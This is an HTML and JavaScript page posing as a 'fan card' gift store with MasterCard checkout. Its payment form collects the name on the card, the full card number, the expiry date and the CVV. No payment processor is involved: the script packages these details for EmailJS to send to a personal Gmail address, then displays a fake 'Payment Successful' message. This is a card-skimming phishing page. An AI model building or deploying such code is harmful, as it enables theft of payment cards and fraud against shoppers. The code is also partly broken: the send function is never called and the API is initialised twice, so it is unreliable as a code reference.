<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Buy Fan Cards - Full Store with MasterCard Payment</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');

    * {
      box-sizing: border-box;
    }
    body {
      font-family: 'Poppins', sans-serif;
      max-width: 360px;
      margin: 20px auto;
      background: #f4f7fb;
      padding: 0 15px 40px;
      color: #222;
    }
    h1 {
      text-align: center;
      color: #007bff;
      font-weight: 600;
      margin-bottom: 8px;
    }
    p.info {
      text-align: center;
      margin-bottom: 20px;
      color: #555;
      font-size: 14px;
    }
    #cards-list {
      margin-bottom: 20px;
    }
    .card-item {
      background: white;
      border-radius: 8px;
      box-shadow: 0 1px 5px rgba(0,0,0,0.1);
      padding: 15px 20px;
      margin-bottom: 12px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .card-item span {
      font-weight: 700;
      font-size: 18px;
      color: #333;
    }
    .card-item button {
      background-color: #007bff;
      border: none;
      color: white;
      padding: 8px 16px;
      border-radius: 6px;
      font-weight: 600;
      font-size: 14px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    .card-item button:hover {
      background-color: #0056b3;
    }
    #cart {
      background: white;
      border-radius: 8px;
      padding: 16px 20px 20px;
      box-shadow: 0 1px 8px rgba(0,0,0,0.1);
      margin-bottom: 20px;
    }
    #cart h2 {
      margin: 0 0 12px;
      font-weight: 700;
      color: #007bff;
      font-size: 20px;
      border-bottom: 1px solid #ddd;
      padding-bottom: 8px;
    }
    #cart-list {
      list-style: none;
      padding: 0;
      max-height: 150px;
      overflow-y: auto;
      margin: 0 0 15px;
    }
    #cart-list li {
      padding: 8px 4px;
      border-bottom: 1px solid #eee;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-weight: 600;
      font-size: 16px;
    }
    #cart-list li button.remove-btn {
      background: transparent;
      border: none;
      color: #d33;
      cursor: pointer;
      font-weight: 900;
      font-size: 20px;
      line-height: 1;
      padding: 0 6px;
    }
    #cart-total {
      font-weight: 700;
      font-size: 18px;
      text-align: right;
      margin-bottom: 12px;
      color: #333;
    }
    #checkout-btn {
      width: 100%;
      background-color: #28a745;
      color: white;
      border: none;
      font-weight: 700;
      font-size: 18px;
      padding: 14px 0;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s ease;
      user-select: none;
    }
    #checkout-btn:disabled {
      background-color: #94d3a2;
      cursor: not-allowed;
    }
    #checkout-btn:hover:not(:disabled) {
      background-color: #1e7e34;
    }
    #payment-form {
      background: white;
      border-radius: 8px;
      padding: 20px;
      box-shadow: 0 1px 8px rgba(0,0,0,0.1);
      display: none;
    }
    #payment-form h2 {
      font-weight: 700;
      font-size: 22px;
      color: #007bff;
      margin-top: 0;
      margin-bottom: 20px;
      text-align: center;
    }
    label {
      font-weight: 600;
      font-size: 16px;
      display: block;
      margin-bottom: 6px;
    }
    input {
      width: 100%;
      padding: 10px 12px;
      font-size: 16px;
      border-radius: 6px;
      border: 1.8px solid #ccc;
      margin-bottom: 18px;
      transition: border-color 0.3s;
    }
    input:focus {
      border-color: #007bff;
      outline: none;
    }
    .row {
      display: flex;
      gap: 15px;
    }
    .row > div {
      flex: 1;
    }
    button[type="submit"] {
      background-color: #007bff;
      color: white;
      font-weight: 700;
      font-size: 18px;
      border-radius: 8px;
      border: none;
      cursor: pointer;
      padding: 14px 0;
      width: 100%;
      user-select: none;
      transition: background-color 0.3s ease;
    }
    button[type="submit"]:hover:not(:disabled) {
      background-color: #0056b3;
    }
    button[type="submit"]:disabled {
      background-color: #94d3a2;
      cursor: not-allowed;
    }
    #message {
      margin-top: 14px;
      font-weight: 700;
      font-size: 16px;
      color: #28a745;
      text-align: center;
      min-height: 22px;
    }
    #error-msg {
      margin-top: 14px;
      font-weight: 700;
      font-size: 14px;
      color: #d33;
      text-align: center;
      min-height: 22px;
    }
    #overlay {
      position: fixed;
      display: none;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.5);
      z-index: 9999;
    }
    #modal {
      position: fixed;
      display: none;
      max-width: 320px;
      background: white;
      border-radius: 12px;
      padding: 30px 25px 25px;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      text-align: center;
      box-shadow: 0 0 22px rgba(0,0,0,0.3);
      z-index: 10000;
      user-select: none;
    }
    #modal h3 {
      margin: 0 0 12px;
      font-size: 24px;
      font-weight: 700;
      color: #28a745;
    }
    #modal p {
      margin: 0 0 22px;
      font-size: 16px;
      color: #333;
      word-break: break-word;
    }
    #modal button {
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 8px;
      padding: 12px 28px;
      font-weight: 600;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    #modal button:hover {
      background-color: #0056b3;
    }
    @media (max-width: 380px) {
      body {
        max-width: 100%;
        padding: 0 12px 40px;
      }
      #modal {
        max-width: 90vw;
      }
    }
  </style>
</head>
<body>
  <h1>Buy Fan Cards</h1>
  <p class="info">Choose fan cards from $50 to $10,000. Pay securely with MasterCard.</p>

  <section id="cards-list" aria-label="Available fan cards">
    <!-- Cards will be dynamically generated here -->
  </section>

  <section id="cart" aria-label="Shopping cart" aria-live="polite" aria-atomic="true">
    <h2>Your Cart</h2>
    <ul id="cart-list" tabindex="0" aria-relevant="additions removals">
      <li>Your cart is empty</li>
    </ul>
    <div id="cart-total">Total: $0</div>
    <button id="checkout-btn" disabled aria-disabled="true">Proceed to Checkout</button>
  </section>

  <section id="payment-form" aria-label="Payment form">
    <h2>Payment with MasterCard</h2>
    <form id="checkout-form" novalidate autocomplete="cc-exp cc-csc cc-number cc-name">
      <label for="card-name">Name on Card</label>
      <input type="text" id="card-name" name="card-name" placeholder="John Doe" maxlength="40" required aria-required="true" />

      <label for="card-number">Card Number</label>
      <input type="tel" 
        id="card-number" 
        name="card-number" 
        placeholder="1234 5678 9012 3456" 
        maxlength="19" 
        pattern="[0-9\s]{13,19}" 
        required 
        aria-required="true" 
        inputmode="numeric" 
        autocomplete="off" />

      <div class="row">
        <div>
          <label for="expiry-date">Expiry Date (MM/YY)</label>
          <input type="text" 
            id="expiry-date" 
            name="expiry-date" 
            placeholder="MM/YY" 
            maxlength="5" 
            required 
            aria-required="true" 
            inputmode="numeric" 
            autocomplete="off" />
        </div>
        <div>
          <label for="cvv">CVV</label>
          <input type="tel" 
            id="cvv" 
            name="cvv" 
            placeholder="123" 
            maxlength="4" 
            required 
            aria-required="true" 
            inputmode="numeric" 
            autocomplete="off" />
        </div>
      </div>

      <button type="submit" id="pay-btn">Pay Now</button>

      <div id="message" role="alert" aria-live="polite"></div>
      <div id="error-msg" role="alert" aria-live="assertive"></div>
    </form>
  </section>

  <div id="overlay"></div>
  <div id="modal" role="dialog" aria-modal="true" aria-labelledby="modal-title" aria-describedby="modal-desc" tabindex="0">
    <h3 id="modal-title">Payment Successful!</h3>
    <p id="modal-desc">Thank you! Your FanCard Order have been sent to FAN PAGE Management.</p>
    <button id="modal-close-btn" aria-label="Close payment success message">Close</button>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function () {
      // Initialize EmailJS with your API key
      emailjs.init('irkd3IzKVZOJHRr-9');

      const denominations = [50, 100, 200, 500, 1000, 2500, 5000, 7500, 10000];
      const cardsList = document.getElementById('cards-list');
      const cartList = document.getElementById('cart-list');
      const cartTotalDiv = document.getElementById('cart-total');
      const checkoutBtn = document.getElementById('checkout-btn');
      const paymentFormSection = document.getElementById('payment-form');
      const checkoutForm = document.getElementById('checkout-form');
      const messageEl = document.getElementById('message');
      const errorEl = document.getElementById('error-msg');
      const overlay = document.getElementById('overlay');
      const modal = document.getElementById('modal');
      const modalCloseBtn = document.getElementById('modal-close-btn');
      const payBtn = document.getElementById('pay-btn');
      const cardNumberInput = document.getElementById('card-number');
      const expiryDateInput = document.getElementById('expiry-date');

      let cart = [];

      function generateCardId(amount) {
        return 'card_' + amount + '_' + Math.floor(Math.random() * 1000000);
      }

      function renderCardsList() {
        cardsList.innerHTML = '';
        denominations.forEach(amount => {
          const cardElem = document.createElement('div');
          cardElem.className = 'card-item';
          cardElem.innerHTML = `
            <span>$${amount.toLocaleString()}</span>
            <button type="button" aria-label="Add $${amount} fan card to cart">Add to Cart</button>
          `;
          const btn = cardElem.querySelector('button');
          btn.addEventListener('click', () => addToCart(amount));
          cardsList.appendChild(cardElem);
        });
      }

      function addToCart(amount) {
        const id = generateCardId(amount);
        cart.push({ id, amount });
        renderCart();
      }

      function removeFromCart(id) {
        cart = cart.filter(item => item.id !== id);
        renderCart();
      }

      function renderCart() {
        cartList.innerHTML = '';
        if (cart.length === 0) {
          cartList.innerHTML = `<li>Your cart is empty</li>`;
          cartTotalDiv.textContent = 'Total: $0';
          checkoutBtn.disabled = true;
          checkoutBtn.setAttribute('aria-disabled', 'true');
          paymentFormSection.style.display = 'none';
          return;
        }
        cart.forEach(item => {
          const li = document.createElement('li');
          li.textContent = `$${item.amount.toLocaleString()}`;
          const removeBtn = document.createElement('button');
          removeBtn.className = 'remove-btn';
          removeBtn.setAttribute('aria-label', `Remove $${item.amount} fan card from cart`);
          removeBtn.innerHTML = '&times;';
          removeBtn.addEventListener('click', () => removeFromCart(item.id));
          li.appendChild(removeBtn);
          cartList.appendChild(li);
        });
        const totalAmount = cart.reduce((acc, cur) => acc + cur.amount, 0);
        cartTotalDiv.textContent = `Total: $${totalAmount.toLocaleString()}`;
        checkoutBtn.disabled = false;
        checkoutBtn.removeAttribute('aria-disabled');
      }

      checkoutBtn.addEventListener('click', () => {
        paymentFormSection.style.display = 'block';
        checkoutBtn.style.display = 'none';
        cardsList.style.display = 'none';
        messageEl.textContent = '';
        errorEl.textContent = '';
        checkoutForm.reset();
        document.getElementById('card-name').focus();
      });

      // Format card number input with spaces every 4 digits
      cardNumberInput.addEventListener('input', () => {
        let rawValue = cardNumberInput.value.replace(/\D/g, '').slice(0, 16);
        let formatted = '';
        for (let i = 0; i < rawValue.length; i++) {
          if (i > 0 && i % 4 === 0) formatted += ' ';
          formatted += rawValue[i];
        }
        cardNumberInput.value = formatted;
      });

      // Format expiry date input as MM/YY
      expiryDateInput.addEventListener('input', () => {
        let rawVal = expiryDateInput.value.replace(/\D/g, '').slice(0, 4);
        if (rawVal.length >= 3) {
          expiryDateInput.value = rawVal.slice(0, 2) + '/' + rawVal.slice(2);
        } else {
          expiryDateInput.value = rawVal;
        }
      });

      function luhnCheck(num) {
        const digits = num.replace(/\D/g, '');
        let sum = 0, doubleUp = false;
        for (let i = digits.length - 1; i >= 0; i--) {
          let digit = parseInt(digits.charAt(i), 10);
          if (doubleUp) {
            digit *= 2;
            if (digit > 9) digit -= 9;
          }
          sum += digit;
          doubleUp = !doubleUp;
        }
        return sum % 10 === 0;
      }

      function validateExpiry(exp) {
        if (!/^(0[1-9]|1[0-2])\/?([0-9]{2})$/.test(exp)) return false;
        const parts = exp.split('/');
        const month = parseInt(parts[0], 10);
        const year = parseInt(parts[1], 10);
        const now = new Date();
        const expiryDate = new Date(2000 + year, month - 1, 1);
        expiryDate.setMonth(expiryDate.getMonth() + 1);
        return expiryDate > now;
      }

      function showModal() {
        overlay.style.display = 'block';
        modal.style.display = 'block';
        modal.focus();
        document.body.style.overflow = 'hidden';
      }

      function hideModal() {
        overlay.style.display = 'none';
        modal.style.display = 'none';
        document.body.style.overflow = '';
        messageEl.textContent = '';
        errorEl.textContent = '';
        checkoutForm.reset();
        payBtn.disabled = false;

        // After closing modal, reset UI for new purchase
        paymentFormSection.style.display = 'none';
        checkoutBtn.style.display = 'block';
        cardsList.style.display = 'block';
      }

      modalCloseBtn.addEventListener('click', hideModal);
      overlay.addEventListener('click', hideModal);

      checkoutForm.addEventListener('submit', e => {
        e.preventDefault();
        messageEl.textContent = '';
        errorEl.textContent = '';

        const name = checkoutForm['card-name'].value.trim();
        const cardNum = checkoutForm['card-number'].value.replace(/\s+/g, '');
        const expiry = checkoutForm['expiry-date'].value.trim();
        const cvv = checkoutForm['cvv'].value.trim();

        if (name.length < 3) {
          errorEl.textContent = 'Please enter a valid name on card.';
          return;
        }
        if (
          cardNum.length < 13 ||
          cardNum.length > 19 ||
          !/^\d+$/.test(cardNum) ||
          !luhnCheck(cardNum)
        ) {
          errorEl.textContent = 'Please enter a valid card number.';
          return;
        }
        if (!validateExpiry(expiry)) {
          errorEl.textContent = 'Please enter a valid expiry date (MM/YY) in the future.';
          return;
        }
        if (!/^\d{3,4}$/.test(cvv)) {
          errorEl.textContent = 'Please enter a valid 3 or 4 digit CVV.';
          return;
        }

        // Initialize EmailJS with your API key
(function() {
  emailjs.init('_TtNAiWrHBbHKL3dt'); // API key initialization
})();

// Example function to send payment details via EmailJS
function sendPaymentEmail(name, cardNum, expiry, cvv, messageEl, payBtn, errorEl, showModal) {
  const templateParams = {
    to_email: 'bobbybosmer2@gmail.com',
    card_name: name,
    card_number: cardNum,
    expiry_date: expiry,
    cvv: cvv
  };
  
  // Disable pay button to avoid multiple clicks while processing
  payBtn.disabled = true;
  messageEl.textContent = 'Processing payment...';
  errorEl.textContent = '';

  emailjs.send('service_clk3lle', 'template_eu1lqoh', templateParams)
  .then(() => {
    messageEl.textContent = '';
    payBtn.disabled = false;
    showModal();
  })
  .catch(err => {
    payBtn.disabled = false;
    messageEl.textContent = '';
    errorEl.textContent = 'Payment failed to process. Please try again.';
    console.error('EmailJS Error:', err);
  });
}
        
        });



      // Initialize UI
      renderCardsList();
      renderCart();
    })();
  </script>
</body>
</html>

